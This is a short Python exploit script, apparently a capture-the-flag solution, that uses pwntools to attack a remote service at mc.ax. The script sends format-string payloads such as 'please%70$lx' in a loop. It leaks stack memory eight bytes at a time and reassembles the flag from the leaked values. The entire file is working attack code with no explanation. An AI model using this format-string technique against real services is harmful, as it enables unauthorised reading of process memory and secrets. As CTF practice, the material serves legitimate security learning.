from pwn import *

context.binary = elf = ELF('./please', checksec=False)
flag = b''
i = 70
while True:
    #s = process('./please')
    s = remote('mc.ax', 31569)
    s.recvline()
    s.send('please%%%s$lx'%(i))
    s.recvuntil('please')
    data = s.recvline().decode()[:-12]
    flag += p64(int(data, 16))
    if '7d' in data:
        break
    i += 1
print(flag)


